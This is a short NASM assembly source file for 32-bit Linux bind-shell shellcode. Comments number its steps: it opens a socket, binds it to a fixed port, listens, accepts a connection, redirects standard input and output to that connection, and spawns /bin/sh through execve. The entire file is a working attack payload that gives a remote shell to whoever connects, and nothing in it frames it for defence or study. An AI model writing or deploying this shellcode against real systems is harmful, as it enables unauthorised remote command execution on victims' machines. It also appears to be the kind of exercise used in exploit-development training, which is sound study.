; bindshell.nasm

global _start

section .text

_start:

    ; // 1. Create socket

    xor eax, eax
    mov al, 0x66

    xor ebx, ebx
    mov bl, 0x1

    xor ecx, ecx
    push ecx
    push ebx
    push 0x2
    mov ecx, esp
    int 0x80
    mov esi, eax

    ; // 2. Bind socket

    mov al, 0x66

    pop ebx

    xor edx, edx
    push edx
    push word 0xba13
    push bx
    mov ecx, esp

    push 0x10
    push ecx
    push esi
    mov ecx, esp
    int 0x80

    ; // 3. Set socket into passive listening mode

    push eax
    push esi
    mov ecx, esp
    add ebx, 0x2
    mov al, 0x66
    int 0x80

    ; // 4. Handle incoming connection

    push eax
    push eax
    push esi
    mov ecx, esp
    inc ebx
    mov al, 0x66
    int 0x80

    ; // 5. Duplicate stdin, stdout and stderr file descriptors

    xchg ebx, eax

    xor ecx, ecx
    mov cl, 0x2

    loop:

        mov al, 0x3f
        int 0x80
        dec ecx
        jns loop

    ; // 6. Spawn shell

    push edx
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp
    inc ecx

    mov al, 0xb
    int 0x80
